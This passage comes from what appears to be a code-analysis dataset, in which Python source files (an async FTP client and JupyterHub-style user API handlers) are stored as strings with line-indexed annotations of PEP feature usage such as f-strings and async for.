info = await self.command(None, \"220\", \"120\")\n        return info\n    async def login(self, user=DEFAULT_USER, password=DEFAULT_PASSWORD,\n                    account=DEFAULT_ACCOUNT):\n        code, info = await self.command(\"USER \" + user, (\"230\", \"33x\"))\n        while code.matches(\"33x\"):\n            if code == \"331\":\n                cmd = \"PASS \" + password\n            elif code == \"332\":\n                cmd = \"ACCT \" + account\n            else:\n                raise errors.StatusCodeError(\"33x\", code, info)\n            code, info = await self.command(cmd, (\"230\", \"33x\"))\n    async def get_current_directory(self):\n        code, info = await self.command(\"PWD\", \"257\")\n        directory = self.parse_directory_response(info[-1])\n        return directory\n    async def change_directory(self, path=\"..\"):\n        path = pathlib.PurePosixPath(path)\n        if path == pathlib.PurePosixPath(\"..\"):\n            cmd = \"CDUP\"\n        else:\n            cmd = \"CWD \" + str(path)\n        await self.command(cmd, \"2xx\")\n    async def make_directory(self, path, *, parents=True):\n        path = pathlib.PurePosixPath(path)\n        need_create = []\n        while path.name and not await self.exists(path):\n            need_create.append(path)\n            path = path.parent\n            if not parents:\n                break\n        need_create.reverse()\n        for path in need_create:\n            await self.command(\"MKD \" + str(path), \"257\")\n    async def remove_directory(self, path):\n        await self.command(\"RMD \" + str(path), \"250\")\n    def list(self, path=\"\", *, recursive=False, raw_command=None):\n        class AsyncLister(AsyncListerMixin):\n            stream = None\n            async def _new_stream(cls, local_path):\n                cls.path = local_path\n                cls.parse_line = self.parse_mlsx_line\n                if raw_command not in [None, \"MLSD\", \"LIST\"]:\n                    raise ValueError(\"raw_command must be one of MLSD or \"\n                                     f\"LIST, but got {raw_command}\")\n                if raw_command in [None, \"MLSD\"]:\n                    try:\n                        command = (\"MLSD \" + str(cls.path)).strip()\n                        return await self.get_stream(command, \"1xx\")\n                    except errors.StatusCodeError as e:\n                        code = e.received_codes[-1]\n                        if not code.matches(\"50x\") or raw_command is not None:\n                            raise\n                if raw_command in [None, \"LIST\"]:\n                    cls.parse_line = self.parse_list_line\n                    command = (\"LIST \" + str(cls.path)).strip()\n                    return await self.get_stream(command, \"1xx\")\n            def __aiter__(cls):\n                cls.directories = collections.deque()\n                return cls\n            async def __anext__(cls):\n                if cls.stream is None:\n                    cls.stream = await cls._new_stream(path)\n                while True:\n                    line = await cls.stream.readline()\n                    while not line:\n                        await cls.stream.finish()\n                        if cls.directories:\n                            current_path, info = cls.directories.popleft()\n                            cls.stream = await cls._new_stream(current_path)\n                            line = await cls.stream.readline()\n                        else:\n                            raise StopAsyncIteration\n                    try:\n                        name, info = cls.parse_line(line)\n                    except Exception:\n                        continue\n                    stat = cls.path / name, info\n                    if info[\"type\"] == \"dir\" and recursive:\n                        cls.directories.append(stat)\n                    return stat\n        return AsyncLister()\n    async def stat(self, path):\n        path = pathlib.PurePosixPath(path)\n        try:\n            code, info = await self.command(\"MLST \" + str(path), \"2xx\")\n            name, info = self.parse_mlsx_line(info[1].lstrip())\n            return info\n        except errors.StatusCodeError as e:\n            if not e.received_codes[-1].matches(\"50x\"):\n                raise\n        for p, info in await self.list(path.parent):\n            if p.name == path.name:\n                return info\n        else:\n            raise errors.StatusCodeError(\n                Code(\"2xx\"),\n                Code(\"550\"),\n                \"path does not exists\",\n            )\n    async def is_file(self, path):\n        info = await self.stat(path)\n        return info[\"type\"] == \"file\"\n    async def is_dir(self, path):\n        info = await self.stat(path)\n        return info[\"type\"] == \"dir\"\n    async def exists(self, path):\n        try:\n            await self.stat(path)\n            return True\n        except errors.StatusCodeError as e:\n            if e.received_codes[-1].matches(\"550\"):\n                return False\n            raise\n    async def rename(self, source, destination):\n        await self.command(\"RNFR \" + str(source), \"350\")\n        await self.command(\"RNTO \" + str(destination), \"2xx\")\n    async def remove_file(self, path):\n        await self.command(\"DELE \" + str(path), \"2xx\")\n    async def remove(self, path):\n        if await self.exists(path):\n            info = await self.stat(path)\n            if info[\"type\"] == \"file\":\n                await self.remove_file(path)\n            elif info[\"type\"] == \"dir\":\n                for name, info in (await self.list(path)):\n                    if info[\"type\"] in (\"dir\", \"file\"):\n                        await self.remove(name)\n                await self.remove_directory(path)\n    def upload_stream(self, destination, *, offset=0):\n        return self.get_stream(\n            \"STOR \" + str(destination),\n            \"1xx\",\n            offset=offset,\n        )\n    def append_stream(self, destination, *, offset=0):\n        return self.get_stream(\n            \"APPE \" + str(destination),\n            \"1xx\",\n            offset=offset,\n        )\n    async def upload(self, source, destination=\"\", *, write_into=False,\n                     block_size=DEFAULT_BLOCK_SIZE):\n        source = pathlib.Path(source)\n        destination = pathlib.PurePosixPath(destination)\n        if not write_into:\n            destination = destination / source.name\n        if await self.path_io.is_file(source):\n            await self.make_directory(destination.parent)\n            async with self.path_io.open(source, mode=\"rb\") as file_in, \\\n                    self.upload_stream(destination) as stream:\n                async for block in file_in.iter_by_block(block_size):\n                    await stream.write(block)\n        elif await self.path_io.is_dir(source):\n            await self.make_directory(destination)\n            sources = collections.deque([source])\n            while sources:\n                src = sources.popleft()\n                async for path in self.path_io.list(src):\n                    if write_into:\n                        relative = destination.name / path.relative_to(source)\n                    else:\n                        relative = path.relative_to(source.parent)\n                    if await self.path_io.is_dir(path):\n                        await self.make_directory(relative)\n                        sources.append(path)\n                    else:\n                        await self.upload(\n                            path,\n                            relative,\n                            write_into=True,\n                            block_size=block_size\n                        )\n    def download_stream(self, source, *, offset=0):\n        return self.get_stream(\"RETR \" + str(source), \"1xx\", offset=offset)\n    async def download(self, source, destination=\"\", *, write_into=False,\n                       block_size=DEFAULT_BLOCK_SIZE):\n        source = pathlib.PurePosixPath(source)\n        destination = pathlib.Path(destination)\n        if not write_into:\n            destination = destination / source.name\n        if await self.is_file(source):\n            await self.path_io.mkdir(destination.parent,\n                                     parents=True, exist_ok=True)\n            async with self.path_io.open(destination, mode=\"wb\") as file_out, \\\n                    self.download_stream(source) as stream:\n                async for block in stream.iter_by_block(block_size):\n                    await file_out.write(block)\n        elif await self.is_dir(source):\n            await self.path_io.mkdir(destination, parents=True, exist_ok=True)\n            for name, info in (await self.list(source)):\n                full = destination / name.relative_to(source)\n                if info[\"type\"] in (\"file\", \"dir\"):\n                    await self.download(name, full, write_into=True,\n                                        block_size=block_size)\n    async def quit(self):\n        await self.command(\"QUIT\", \"2xx\")\n        self.close()\n    async def _do_epsv(self):\n        code, info = await self.command(\"EPSV\", \"229\")\n        ip, port = self.parse_epsv_response(info[-1])\n        return ip, port\n    async def _do_pasv(self):\n        code, info = await self.command(\"PASV\", \"227\")\n        ip, port = self.parse_pasv_response(info[-1])\n        return ip, port\n    async def get_passive_connection(self, conn_type=\"I\",\n                                     commands=(\"epsv\", \"pasv\")):\n        functions = {\n            \"epsv\": self._do_epsv,\n            \"pasv\": self._do_pasv,\n        }\n        if not commands:\n            raise ValueError(\"No passive commands provided\")\n        await self.command(\"TYPE \" + conn_type, \"200\")\n        for i, name in enumerate(commands, start=1):\n            name = name.lower()\n            if name not in functions:\n                raise ValueError(f\"{name!r} not in {set(functions)!r}\")\n            try:\n                ip, port = await functions[name]()\n                break\n            except errors.StatusCodeError as e:\n                is_last = i == len(commands)\n                if is_last or not e.received_codes[-1].matches(\"50x\"):\n                    raise\n        if ip in (\"0.0.0.0\", None):\n            ip = self.server_host\n        reader, writer = await self._open_connection(ip, port)\n        return reader, writer\n    @async_enterable\n    async def get_stream(self, *command_args, conn_type=\"I\", offset=0):\n        reader, writer = await self.get_passive_connection(conn_type)\n        if offset:\n            await self.command(\"REST \" + str(offset), \"350\")\n        await self.command(*command_args)\n        stream = DataConnectionThrottleStreamIO(\n            self,\n            reader,\n            writer,\n            throttles={\"_\": self.throttle},\n            timeout=self.socket_timeout,\n        )\n        return stream\n    async def abort(self, *, wait=True):\n        if wait:\n            await self.command(\"ABOR\", \"226\", \"426\")\n        else:\n            await self.command(\"ABOR\")\nclass ClientSession:\n    def __init__(self, host, port=DEFAULT_PORT, user=DEFAULT_USER,\n                 password=DEFAULT_PASSWORD, account=DEFAULT_ACCOUNT, **kwargs):\n        self.host = host\n        self.port = port\n        self.user = user\n        self.password = password\n        self.account = account\n        self.kwargs = kwargs\n    async def __aenter__(self):\n        self.client = Client(**self.kwargs)\n        try:\n            await self.client.connect(self.host, self.port)\n            await self.client.login(self.user, self.password, self.account)\n        except Exception:\n            self.client.close()\n            raise\n        return self.client\n    async def __aexit__(self, *exc_info):\n        await self.client.quit()",
            "patterns": {
                "pep_468": [
                    [
                        41,
                        "super().__init__(*args, **kwargs)"
                    ],
                    [
                        68,
                        "partial(open_connection, ssl=self.ssl,\n                                        **siosocks_asyncio_kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        10,
                        10,
                        "import",
                        "    from asyncio import open_connection"
                    ]
                ],
                "pep_525": [
                    [
                        442,
                        443,
                        "async for",
                        "async for block in file_in.iter_by_block(block_size):\n                    await stream.write(block)"
                    ],
                    [
                        477,
                        478,
                        "async for",
                        "async for block in stream.iter_by_block(block_size):\n                    await file_out.write(block)"
                    ],
                    [
                        449,
                        463,
                        "async for",
                        "async for path in self.path_io.list(src):\n                    if write_into:\n                        relative = destination.name / path.relative_to(source)\n                    else:\n                        relative = path.relative_to(source.parent)\n                    if await self.path_io.is_dir(path):\n                        await self.make_directory(relative)\n                        sources.append(path)\n                    else:\n                        await self.upload(\n                            path,\n                            relative,\n                            write_into=True,\n                            block_size=block_size\n                        )"
                    ]
                ],
                "pep_498": [
                    [
                        509,
                        "                raise ValueError(f\"{name!r} not in {set(functions)!r}\")"
                    ],
                    [
                        334,
                        "                    raise ValueError(\"raw_command must be one of MLSD or \""
                    ]
                ]
            }
        },
        "4": {
            "file": "import asyncio\nimport json\nfrom datetime import datetime\nfrom datetime import timedelta\nfrom datetime import timezone\nfrom async_generator import aclosing\nfrom dateutil.parser import parse as parse_date\nfrom sqlalchemy import func\nfrom tornado import web\nfrom tornado.iostream import StreamClosedError\nfrom .. import orm\nfrom .. import scopes\nfrom ..roles import assign_default_roles\nfrom ..scopes import needs_scope\nfrom ..user import User\nfrom ..utils import isoformat\nfrom ..utils import iterate_until\nfrom ..utils import maybe_future\nfrom ..utils import url_path_join\nfrom .base import APIHandler\nclass SelfAPIHandler(APIHandler):\n    async def get(self):\n        user = self.current_user\n        if user is None:\n            raise web.HTTPError(403)\n        _added_scopes = set()\n        if isinstance(user, orm.Service):\n            identify_scopes = scopes.identify_scopes(user)\n            get_model = self.service_model\n        else:\n            identify_scopes = scopes.identify_scopes(user.orm_user)\n            get_model = self.user_model\n        for scope in identify_scopes:\n            if scope not in self.expanded_scopes:\n                _added_scopes.add(scope)\n                self.expanded_scopes.add(scope)\n        if _added_scopes:\n            self.parsed_scopes = scopes.parse_scopes(self.expanded_scopes)\n        model = get_model(user)\n        model[\"scopes\"] = sorted(self.expanded_scopes.difference(_added_scopes))\n        self.write(json.dumps(model))\nclass UserListAPIHandler(APIHandler):\n    def _user_has_ready_spawner(self, orm_user):\n        user = self.users[orm_user]\n        return any(spawner.ready for spawner in user.spawners.values())\n    @needs_scope(\n        'read:users',\n        'read:users:name',\n        'read:servers',\n        'read:users:groups',\n        'read:users:activity',\n        'read:roles:users',\n    )\n    def get(self):\n        state_filter = self.get_argument(\"state\", None)\n        offset, limit = self.get_api_pagination()\n        post_filter = None\n        if state_filter in {\"active\", \"ready\"}:\n            query = (\n                self.db.query(orm.User)\n                .join(orm.Spawner)\n                .filter(orm.Spawner.server != None)\n            )\n            if state_filter == \"ready\":\n                post_filter = self._user_has_ready_spawner\n        elif state_filter == \"inactive\":\n            query = (\n                self.db.query(orm.User)\n                .outerjoin(orm.Spawner)\n                .outerjoin(orm.Server)\n                .group_by(orm.User.id)\n                .having(func.count(orm.Server.id) == 0)\n            )\n        elif state_filter:\n            raise web.HTTPError(400, \"Unrecognized state filter: %r\" % state_filter)\n        else:\n            query = self.db.query(orm.User)\n        query = query.offset(offset).limit(limit)\n        data = []\n        for u in query:\n            if post_filter is None or post_filter(u):\n                user_model = self.user_model(u)\n                if user_model:\n                    data.append(user_model)\n        self.write(json.dumps(data))\n    @needs_scope('admin:users')\n    async def post(self):\n        data = self.get_json_body()\n        if not data or not isinstance(data, dict) or not data.get('usernames'):\n            raise web.HTTPError(400, \"Must specify at least one user to create\")\n        usernames = data.pop('usernames')\n        self._check_user_model(data)\n        admin = data.get('admin', False)\n        to_create = []\n        invalid_names = []\n        for name in usernames:\n            name = self.authenticator.normalize_username(name)\n            if not self.authenticator.validate_username(name):\n                invalid_names.append(name)\n                continue\n            user = self.find_user(name)\n            if user is not None:\n                self.log.warning(\"User %s already exists\" % name)\n            else:\n                to_create.append(name)\n        if invalid_names:\n            if len(invalid_names) == 1:\n                msg = \"Invalid username: %s\" % invalid_names[0]\n            else:\n                msg = \"Invalid usernames: %s\" % ', '.join(invalid_names)\n            raise web.HTTPError(400, msg)\n        if not to_create:\n            raise web.HTTPError(409, \"All %i users already exist\" % len(usernames))\n        created = []\n        for name in to_create:\n            user = self.user_from_username(name)\n            if admin:\n                user.admin = True\n            assign_default_roles(self.db, entity=user)\n            self.db.commit()\n            try:\n                await maybe_future(self.authenticator.add_user(user))\n            except Exception as e:\n                self.log.error(\"Failed to create user: %s\" % name, exc_info=True)\n                self.users.delete(user)\n                raise web.HTTPError(\n                    400, \"Failed to create user %s: %s\" % (name, str(e))\n                )\n            else:\n                created.append(user)\n        self.write(json.dumps([self.user_model(u) for u in created]))\n        self.set_status(201)\nclass UserAPIHandler(APIHandler):\n    @needs_scope(\n        'read:users',\n        'read:users:name',\n        'read:servers',\n        'read:users:groups',\n        'read:users:activity',\n        'read:roles:users',\n    )\n    async def get(self, user_name):\n        user = self.find_user(user_name)\n        if user is None:\n            raise web.HTTPError(404)\n        model = self.user_model(user)\n        if 'auth_state' in model:\n            model['auth_state'] = await user.get_auth_state()\n        self.write(json.dumps(model))\n    @needs_scope('admin:users')\n    async def post(self, user_name):\n        data = self.get_json_body()\n        user = self.find_user(user_name)\n        if user is not None:\n            raise web.HTTPError(409, \"User %s already exists\" % user_name)\n        user = self.user_from_username(user_name)\n        if data:\n            self._check_user_model(data)\n            if 'admin' in data:\n                user.admin = data['admin']\n                assign_default_roles(self.db, entity=user)\n        self.db.commit()\n        try:\n            await maybe_future(self.authenticator.add_user(user))\n        except Exception:\n            self.log.error(\"Failed to create user: %s\" % user_name, exc_info=True)\n            self.users.delete(user)\n            raise web.HTTPError(400, \"Failed to create user: %s\" % user_name)\n        self.write(json.dumps(self.user_model(user)))\n        self.set_status(201)\n    @needs_scope('admin:users')\n    async def delete(self, user_name):\n        user = self.find_user(user_name)\n        if user is None:\n            raise web.HTTPError(404)\n        if user.name == self.current_user.name:\n            raise web.HTTPError(400, \"Cannot delete yourself!\")\n        if user.spawner._stop_pending:\n            raise web.HTTPError(\n                400,\n                \"%s's server is in the process of stopping, please wait.\" % user_name,\n            )\n        if user.running:\n            await self.stop_single_user(user)\n            if user.spawner._stop_pending:\n                raise web.HTTPError(\n                    400,\n                    \"%s's server is in the process of stopping, please wait.\"\n                    % user_name,\n                )\n        await maybe_future(self.authenticator.delete_user(user))\n        await user.delete_spawners()\n        self.users.delete(user)\n        self.set_status(204)\n    @needs_scope('admin:users')\n    async def patch(self, user_name):\n        user = self.find_user(user_name)\n        if user is None:\n            raise web.HTTPError(404)\n        data = self.get_json_body()\n        self._check_user_model(data)\n        if 'name' in data and data['name'] != user_name:\n            if self.find_user(data['name']):\n                raise web.HTTPError(\n                    400,\n                    \"User %s already exists, username must be unique\" % data['name'],\n                )\n        for key, value in data.items():\n            if key == 'auth_state':\n                await user.save_auth_state(value)\n            else:\n                setattr(user, key, value)\n                if key == 'admin':\n                    assign_default_roles(self.db, entity=user)\n        self.db.commit()\n        user_ = self.user_model(user)\n        user_['auth_state'] = await user.get_auth_state()\n        self.write(json.dumps(user_))\nclass UserTokenListAPIHandler(APIHandler):\n    @needs_scope('read:tokens')\n    def get(self, user_name):\n        user = self.find_user(user_name)\n        if not user:\n            raise web.HTTPError(404, \"No such user: %s\" % user_name)\n        now = datetime.utcnow()\n        api_tokens = []\n        def sort_key(token):\n            return token.last_activity or token.created\n        for token in sorted(user.api_tokens, key=sort_key):\n            if token.expires_at and token.expires_at < now:\n                self.db.delete(token)\n                self.db.commit()\n                continue\n            api_tokens.append(self.token_model(token))\n        self.write(json.dumps({'api_tokens': api_tokens}))\n    async def post(self, user_name):\n        body = self.get_json_body() or {}\n        if not isinstance(body, dict):\n            raise web.HTTPError(400, \"Body must be a JSON dict or empty\")\n        requester = self.current_user\n        if requester is None:\n            try:\n                name = await self.authenticate(body.get('auth'))\n                if isinstance(name, dict):\n                    name = name.get('name')\n            except web.HTTPError as e:\n                raise web.HTTPError(403)\n            except Exception as e:\n                self.log.error(\n                    \"Error authenticating request for %s: %s\", self.request.uri, e\n                )\n                raise web.HTTPError(403)\n            requester = self.find_user(name)\n        if requester is None:\n            raise web.HTTPError(403)\n        self._jupyterhub_user = requester\n        self._resolve_roles_and_scopes()\n        user = self.find_user(user_name)\n        kind = 'user' if isinstance(requester, User) else 'service'\n        scope_filter = self.get_scope_filter('tokens')\n        if user is None or not scope_filter(user, kind):\n            raise web.HTTPError(\n                403,\n                f\"{kind.title()} {user_name} not found or no permissions to generate tokens\",\n            )\n        note = body.get('note')\n        if not note:\n            note = \"Requested via api\"\n            if requester is not user:\n                note += \" by %s %s\" % (kind, requester.name)\n        token_roles = body.get('roles')\n        try:\n            api_token = user.new_api_token(\n                note=note, expires_in=body.get('expires_in', None), roles=token_roles\n            )\n        except NameError:\n            raise web.HTTPError(404, \"Requested roles %r not found\" % token_roles)\n        except ValueError:\n            raise web.HTTPError(\n                403,\n                \"Requested roles %r cannot have higher permissions than the token owner\"\n                % token_roles,\n            )\n        if requester is not user:\n            self.log.info(\n                \"%s %s requested API token for %s\",\n                kind.title(),\n                requester.name,\n                user.name,\n            )\n        else:\n            user_kind = 'user' if isinstance(user, User) else 'service'\n            self.log.info(\"%s %s requested new API token\", user_kind.title(), user.name)\n        token_model = self.token_model(orm.APIToken.find(self.db, api_token))\n        token_model['token'] = api_token\n        self.write(json.dumps(token_model))\nclass UserTokenAPIHandler(APIHandler):\n    def find_token_by_id(self, user, token_id):\n        not_found = \"No such token %s for user %s\" % (token_id, user.name)\n        prefix, id_ = token_id[:1], token_id[1:]\n        if prefix != 'a':\n            raise web.HTTPError(404, not_found)\n        try:\n            id_ = int(id_)\n        except ValueError:\n            raise web.HTTPError(404, not_found)\n        orm_token = self.db.query(orm.APIToken).filter_by(id=id_).first()\n        if orm_token is None or orm_token.user is not user.orm_user:\n            raise web.HTTPError(404, \"Token not found %s\", orm_token)\n        return orm_token\n    @needs_scope('read:tokens')\n    def get(self, user_name, token_id):\n        user = self.find_user(user_name)\n        if not user:\n            raise web.HTTPError(404, \"No such user: %s\" % user_name)\n        token = self.find_token_by_id(user, token_id)\n        self.write(json.dumps(self.token_model(token)))\n    @needs_scope('tokens')\n    def delete(self, user_name, token_id):\n        user = self.find_user(user_name)\n        if not user:\n            raise web.HTTPError(404, \"No such user: %s\" % user_name)\n        token = self.find_token_by_id(user, token_id)\n        client_id = token.client_id\n        if token.client_id != \"jupyterhub\":\n            tokens = [\n                token for token in user.api_tokens if token.client_id == client_id\n            ]\n        else:\n            tokens = [token]\n        for token in tokens:\n            self.db.delete(token)\n        self.db.commit()\n        self.set_header('Content-Type', 'text/plain')\n        self.set_status(204)\nclass UserServerAPIHandler(APIHandler):\n    @needs_scope('servers')\n    async def post(self, user_name, server_name=''):\n        user = self.find_user(user_name)\n        if server_name:\n            if not self.allow_named_servers:\n                raise web.HTTPError(400, \"Named servers are not enabled.\")\n            if (\n                self.named_server_limit_per_user > 0\n                and server_name not in user.orm_spawners\n            ):\n                named_spawners = list(user.all_spawners(include_default=False))\n                if self.named_server_limit_per_user <= len(named_spawners):\n                    raise web.HTTPError(\n                        400,\n                        \"User {} already has the maximum of {} named servers.\"\n                        \"  One must be deleted before a new server can be created\".format(\n                            user_name, self.named_server_limit_per_user\n                        ),\n                    )\n        spawner = user.spawners[server_name]\n        pending = spawner.pending\n        if pending == 'spawn':\n            self.set_header('Content-Type', 'text/plain')\n            self.set_status(202)\n            return\n        elif pending:\n            raise web.HTTPError(400, \"%s is pending %s\" % (spawner._log_name, pending))\n        if spawner.ready:\n            spawner._spawn_pending = True\n            try:\n                state = await spawner.poll_and_notify()\n            finally:\n                spawner._spawn_pending = False\n            if state is None:\n                raise web.HTTPError(400, \"%s is already running\" % spawner._log_name)\n        options = self.get_json_body()\n        await self.spawn_single_user(user, server_name, options=options)\n        status = 202 if spawner.pending == 'spawn' else 201\n        self.set_header('Content-Type', 'text/plain')\n        self.set_status(status)\n    @needs_scope('servers')\n    async def delete(self, user_name, server_name=''):\n        user = self.find_user(user_name)\n        options = self.get_json_body()\n        remove = (options or {}).get('remove', False)\n        async def _remove_spawner(f=None):\n            if f:\n                await f\n            self.log.info(\"Deleting spawner %s\", spawner._log_name)\n            await maybe_future(user._delete_spawner(spawner))\n            self.db.delete(spawner.orm_spawner)\n            user.spawners.pop(server_name, None)\n            self.db.commit()\n        if server_name:\n            if not self.allow_named_servers:\n                raise web.HTTPError(400, \"Named servers are not enabled.\")\n            if server_name not in user.orm_spawners:\n                raise web.HTTPError(\n                    404, \"%s has no server named '%s'\" % (user_name, server_name)\n                )\n        elif remove:\n            raise web.HTTPError(400, \"Cannot delete the default server\")\n        spawner = user.spawners[server_name]\n        if spawner.pending == 'stop':\n            self.log.debug(\"%s already stopping\", spawner._log_name)\n            self.set_header('Content-Type', 'text/plain')\n            self.set_status(202)\n            if remove:\n                asyncio.ensure_future(_remove_spawner(spawner._stop_future))\n            return\n        if spawner.pending:\n            raise web.HTTPError(\n                400,\n                \"%s is pending %s, please wait\" % (spawner._log_name, spawner.pending),\n            )\n        stop_future = None\n        if spawner.ready:\n            status = await spawner.poll_and_notify()\n            if status is None:\n                stop_future = await self.stop_single_user(user, server_name)\n        if remove:\n            if stop_future:\n                asyncio.ensure_future(_remove_spawner(spawner._stop_future))\n            else:\n                await _remove_spawner()\n        status = 202 if spawner._stop_pending else 204\n        self.set_header('Content-Type', 'text/plain')\n        self.set_status(status)\nclass UserAdminAccessAPIHandler(APIHandler):\n    @needs_scope('servers')\n    def post(self, user_name):\n        self.log.warning(\n            \"Deprecated in JupyterHub 0.8.\"\n            \" Admin access API is not needed now that we use OAuth.\"\n        )\n        current = self.current_user\n        self.log.warning(\n            \"Admin user %s has requested access to %s's server\", current.name, user_name\n        )\n        if not self.settings.get('admin_access', False):\n            raise web.HTTPError(403, \"admin access to user servers disabled\")\n        user = self.find_user(user_name)\n        if user is None:\n            raise web.HTTPError(404)\nclass SpawnProgressAPIHandler(APIHandler):\n    keepalive_interval = 8\n    def get_content_type(self):\n        return 'text/event-stream'\n    async def send_event(self, event):\n        try:\n            self.write('data: {}\\n\\n'.format(json.dumps(event)))\n            await self.flush()\n        except StreamClosedError:\n            self.log.warning(\"Stream closed while handling %s\", self.request.uri)\n            raise web.Finish()\n    def initialize(self):\n        super().initialize()\n        self._finish_future = asyncio.Future()\n    def on_finish(self):\n        self._finish_future.set_result(None)\n    async def keepalive(self):\n        while not self._finish_future.done():\n            try:\n                self.write(\"\\n\\n\")\n                await self.flush()\n            except (StreamClosedError, RuntimeError):\n                return\n            await asyncio.wait([self._finish_future], timeout=self.keepalive_interval)\n    @needs_scope('read:servers')\n    async def get(self, user_name, server_name=''):\n        self.set_header('Cache-Control', 'no-cache')\n        if server_name is None:\n            server_name = ''\n        user = self.find_user(user_name)\n        if user is None:\n            raise web.HTTPError(404)\n        if server_name not in user.spawners:\n            raise web.HTTPError(404)\n        spawner = user.spawners[server_name]\n        asyncio.ensure_future(self.keepalive())\n        url = url_path_join(user.url, server_name, '/')\n        ready_event = {\n            'progress': 100,\n            'ready': True,\n            'message': \"Server ready at {}\".format(url),\n            'html_message': 'Server ready at <a href=\"{0}\">{0}</a>'.format(url),\n            'url': url,\n        }\n        failed_event = {'progress': 100, 'failed': True, 'message': \"Spawn failed\"}\n        if spawner.ready:\n            self.log.info(\"Server %s is already started\", spawner._log_name)\n            await self.send_event(ready_event)\n            return\n        spawn_future = spawner._spawn_future\n        if not spawner._spawn_pending:\n            f = spawn_future\n            if f and f.done() and f.exception():\n                failed_event['message'] = \"Spawn failed: %s\" % f.exception()\n                await self.send_event(failed_event)\n                return\n            else:\n                raise web.HTTPError(400, \"%s is not starting...\", spawner._log_name)\n        async with aclosing(\n            iterate_until(spawn_future, spawner._generate_progress())\n        ) as events:\n            try:\n                async for event in events:\n                    if 'ready' in event:\n                        event.pop('ready', None)\n                    await self.send_event(event)\n            except asyncio.CancelledError:\n                pass\n        await asyncio.wait([spawn_future])\n        if spawner.ready:\n            self.log.info(\"Server %s is ready\", spawner._log_name)\n            await self.send_event(ready_event)\n        else:\n            f = spawn_future\n            if f and f.done() and f.exception():\n                failed_event['message'] = \"Spawn failed: %s\" % f.exception()\n            else:\n                self.log.warning(\n                    \"Server %s didn't start for unknown reason\", spawner._log_name\n                )\n            await self.send_event(failed_event)\ndef _parse_timestamp(timestamp):\n    try:\n        dt = parse_date(timestamp)\n    except Exception:\n        raise web.HTTPError(400, \"Not a valid timestamp: %r\", timestamp)\n    if dt.tzinfo:\n        dt = dt.astimezone(timezone.utc).replace(tzinfo=None)\n    now = datetime.utcnow()\n    if (dt - now) > timedelta(minutes=59):\n        raise web.HTTPError(\n            400,\n            \"Rejecting activity from more than an hour in the future: {}\".format(\n                isoformat(dt)\n            ),\n        )\n    return dt\nclass ActivityAPIHandler(APIHandler):\n    def _validate_servers(self, user, servers):\n        msg = \"servers must be a dict of the form {server_name: {last_activity: timestamp}}\"\n        if not isinstance(servers, dict):\n            raise web.HTTPError(400, msg)\n        spawners = user.orm_spawners\n        for server_name, server_info in servers.items():\n            if server_name not in spawners:\n                raise web.HTTPError(\n                    400,\n                    \"No such server '{}' for user {}\".format(server_name, user.name),\n                )\n            if not isinstance(server_info, dict):\n                raise web.HTTPError(400, msg)\n            if 'last_activity' not in server_info:\n                raise web.HTTPError(400, msg)\n            server_info['last_activity'] = _parse_timestamp(\n                server_info['last_activity']\n            )\n        return servers\n    @needs_scope('users:activity')\n    def post(self, user_name):\n        user = self.find_user(user_name)\n        if user is None:\n            raise web.HTTPError(404, \"No such user: %r\", user_name)\n        body = self.get_json_body()\n        if not isinstance(body, dict):\n            raise web.HTTPError(400, \"body must be a json dict\")\n        last_activity_timestamp = body.get('last_activity')\n        servers = body.get('servers')\n        if not last_activity_timestamp and not servers:\n            raise web.HTTPError(\n                400, \"body must contain at least one of `last_activity` or `servers`\"\n            )\n        if servers:\n            servers = self._validate_servers(user, servers)\n        if last_activity_timestamp:\n            last_activity = _parse_timestamp(last_activity_timestamp)\n            if (not user.last_activity) or last_activity > user.last_activity:\n                self.log.debug(\n                    \"Activity for user %s: %s\", user.name, isoformat(last_activity)\n                )\n                user.last_activity = last_activity\n            else:\n                self.log.debug(\n                    \"Not updating activity for %s: %s < %s\",\n                    user,\n                    isoformat(last_activity),\n                    isoformat(user.last_activity),\n                )\n        if servers:\n            for server_name, server_info in servers.items():\n                last_activity = server_info['last_activity']\n                spawner = user.orm_spawners[server_name]\n                if (not spawner.last_activity) or last_activity > spawner.last_activity:\n                    self.log.debug(\n                        \"Activity on server %s/%s: %s\",\n                        user.name,\n                        server_name,\n                        isoformat(last_activity),\n                    )\n                    spawner.last_activity = last_activity\n                else:\n                    self.log.debug(\n                        \"Not updating server activity on %s/%s: %s < %s\",\n                        user.name,\n                        server_name,\n                        isoformat(last_activity),\n                        isoformat(user.last_activity),\n                    )\n        self.db.commit()\ndefault_handlers = [\n    (r\"/api/user\", SelfAPIHandler),\n    (r\"/api/users\", UserListAPIHandler),\n    (r\"/api/users/([^/]+)\", UserAPIHandler),\n    (r\"/api/users/([^/]+)/server\", UserServerAPIHandler),\n    (r\"/api/users/([^/]+)/server/progress\", SpawnProgressAPIHandler),\n    (r\"/api/users/([^/]+)/tokens\", UserTokenListAPIHandler),\n    (r\"/api/users/([^/]+)/tokens/([^/]*)\", UserTokenAPIHandler),\n    (r\"/api/users/([^/]+)/servers/([^/]*)\", UserServerAPIHandler),\n    (r\"/api/users/([^/]+)/servers/([^/]*)/progress\", SpawnProgressAPIHandler),\n    (r\"/api/users/([^/]+)/activity\", ActivityAPIHandler),\n    (r\"/api/users/([^/]+)/admin-access\", UserAdminAccessAPIHandler),\n]",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        503,
                        506,
                        "async for",
                        "async for event in events:\n                    if 'ready' in event:\n                        event.pop('ready', None)\n                    await self.send_event(event)"
                    ]
                ],
                "pep_498v": [
                    [
                        299,
                        299,
                        "%"
                    ],
                    [
                        481,
                        481,
                        ".format()"
                    ],
                    [
                        482,
                        482,
                        ".format()"
                    ],
                    [
                        533,
                        535,
                        ".format()"
                    ],
                    [
                        108,
                        108,
                        "%"
                    ],
                    [
                        110,
                        110,
                        "%"
                    ],
                    [
                        113,
                        113,
                        "%"
                    ],
                    [
                        155,
                        155,
                        "%"
                    ],
                    [
                        181,
                        181,
                        "%"
                    ],
                    [
                        224,
                        224,
                        "%"
                    ],
                    [
                        270,
                        270,
                        "%"
                    ],
                    [
                        315,
                        315,
                        "%"
                    ],
                    [
                        322,
                        322,
                        "%"
                    ],
                    [
                        410,
                        410,
                        "%"
                    ],
                    [
                        447,
                        447,
                        ".format()"
                    ],
                    [
                        494,
                        494,
                        "%"
                    ],
                    [
                        516,
                        516,
                        "%"
                    ],
                    [
                        103,
                        103,
                        "%"
                    ],
                    [
                        166,
                        166,
                        "%"
                    ],
                    [
                        168,
                        168,
                        "%"
